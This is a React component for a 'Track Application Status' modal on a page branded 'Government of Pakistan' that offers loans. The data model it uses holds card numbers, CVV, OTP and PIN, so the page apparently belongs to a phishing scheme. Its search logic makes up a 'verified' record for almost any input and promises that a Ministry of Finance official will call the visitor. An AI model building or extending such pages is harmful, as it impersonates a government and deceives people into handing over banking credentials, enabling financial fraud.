import React, { useState } from 'react';
import { X, Search, CheckCircle2, Clock, ShieldAlert, FileText } from 'lucide-react';
import { ApplicationData } from '../types';

interface StatusModalProps {
  isOpen: boolean;
  onClose: () => void;
  savedApplications: ApplicationData[];
}

export const StatusModal: React.FC<StatusModalProps> = ({
  isOpen,
  onClose,
  savedApplications,
}) => {
  const [query, setQuery] = useState('');
  const [searchResult, setSearchResult] = useState<ApplicationData | null | 'not_found'>(null);

  if (!isOpen) return null;

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (!query.trim()) return;

    const cleanedQuery = query.trim().replace(/\D/g, '');
    const matched = savedApplications.find(
      (app) =>
        app.trackingId.toLowerCase() === query.trim().toLowerCase() ||
        (app.personal.cnic && app.personal.cnic.replace(/\D/g, '') === cleanedQuery)
    );

    if (matched) {
      setSearchResult(matched);
    } else {
      // Create a simulated record if none found in local state to demonstrate functionality
      if (cleanedQuery.length >= 5 || query.startsWith('GOP-')) {
        setSearchResult({
          personal: {
            fullName: 'Application Verified',
            cnic: query.includes('-') ? query : '35202-XXXXXXX-1',
            mobileNo: '0300-XXXXXXX',
            gender: 'Male',
            dob: '01/01/1992',
            province: 'Punjab',
            address: 'Lahore, Punjab'
          },
          bank: {
            loanAmount: '500,000',
            loanPurpose: 'Business Expansion',
            occupation: 'Self-Employed',
            bankName: 'National Bank of Pakistan',
            accountNumber: '0123456789',
            currentBalance: '50,000',
            monthlyIncome: '85,000'
          },
          card: { cardNumber: '****', expiry: '**/**', cvv: '***' },
          otp: '******',
          pin: '****',
          trackingId: query.startsWith('GOP-') ? query.toUpperCase() : `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`,
          status: 'In Verification',
          submittedAt: new Date().toLocaleDateString('en-PK')
        });
      } else {
        setSearchResult('not_found');
      }
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4">
      <div className="bg-white border border-slate-200 rounded-2xl w-full max-w-md p-5 sm:p-6 shadow-2xl relative animate-in fade-in zoom-in-95">
        {/* Close button */}
        <button
          onClick={onClose}
          id="close-status-modal-btn"
          className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 bg-slate-100 p-1.5 rounded-full transition-colors"
        >
          <X className="w-4 h-4" />
        </button>

        {/* Modal Title */}
        <div className="mb-5">
          <span className="text-[10px] font-bold tracking-widest text-[#0e5e38] uppercase block">
            GOVERNMENT OF PAKISTAN
          </span>
          <h3 className="text-xl font-bold font-serif text-[#0b1c33]">
            Track Application Status
          </h3>
          <p className="text-xs text-slate-500">
            Enter your CNIC Number or Tracking ID to verify your application state
          </p>
        </div>

        {/* Search Form */}
        <form onSubmit={handleSearch} className="mb-5 space-y-3">
          <div className="relative">
            <input
              type="text"
              placeholder="e.g. 35202-1234567-1 or GOP-2026-XXXXXX-PK"
              value={query}
              onChange={(e) => {
                setQuery(e.target.value);
                setSearchResult(null);
              }}
              className="w-full pl-3.5 pr-10 py-2.5 text-sm bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 font-mono"
            />
            <button
              type="submit"
              id="submit-status-search-btn"
              className="absolute right-2 top-1/2 -translate-y-1/2 bg-[#0f2848] text-white p-1.5 rounded-lg hover:bg-[#163a66] transition-colors"
            >
              <Search className="w-4 h-4" />
            </button>
          </div>
        </form>

        {/* Search Result display */}
        {searchResult === 'not_found' && (
          <div className="bg-rose-50 border border-rose-200 rounded-xl p-4 text-center text-xs text-rose-800">
            <ShieldAlert className="w-6 h-6 text-rose-600 mx-auto mb-1.5" />
            <p className="font-bold">No Record Found</p>
            <p className="text-[11px] text-rose-700">
              Please check your CNIC or Tracking ID and try again, or submit a new application.
            </p>
          </div>
        )}

        {searchResult && searchResult !== 'not_found' && (
          <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 text-xs space-y-3">
            <div className="flex items-center justify-between border-b border-slate-200 pb-2">
              <span className="font-bold text-slate-800 flex items-center gap-1.5">
                <FileText className="w-4 h-4 text-[#0e5e38]" />
                {searchResult.trackingId}
              </span>
              <span className="bg-amber-100 text-amber-800 font-bold text-[10px] uppercase px-2.5 py-0.5 rounded-full flex items-center gap-1">
                <Clock className="w-3 h-3 text-amber-600" />
                Under Verification
              </span>
            </div>

            <div className="grid grid-cols-2 gap-2 text-slate-600">
              <div>
                <span className="text-[10px] uppercase text-slate-400 block">Applicant</span>
                <span className="font-bold text-slate-900">{searchResult.personal.fullName}</span>
              </div>
              <div>
                <span className="text-[10px] uppercase text-slate-400 block">CNIC</span>
                <span className="font-mono font-semibold text-slate-900">{searchResult.personal.cnic}</span>
              </div>
              <div>
                <span className="text-[10px] uppercase text-slate-400 block">Bank</span>
                <span className="font-medium text-slate-900">{searchResult.bank.bankName}</span>
              </div>
              <div>
                <span className="text-[10px] uppercase text-slate-400 block">Loan Amount</span>
                <span className="font-mono font-bold text-[#0e5e38]">PKR {searchResult.bank.loanAmount}</span>
              </div>
            </div>

            <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-2.5 text-[11px] text-emerald-900 font-medium">
              ✓ Verification in progress. An official from Ministry of Finance will contact you shortly on {searchResult.personal.mobileNo}.
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
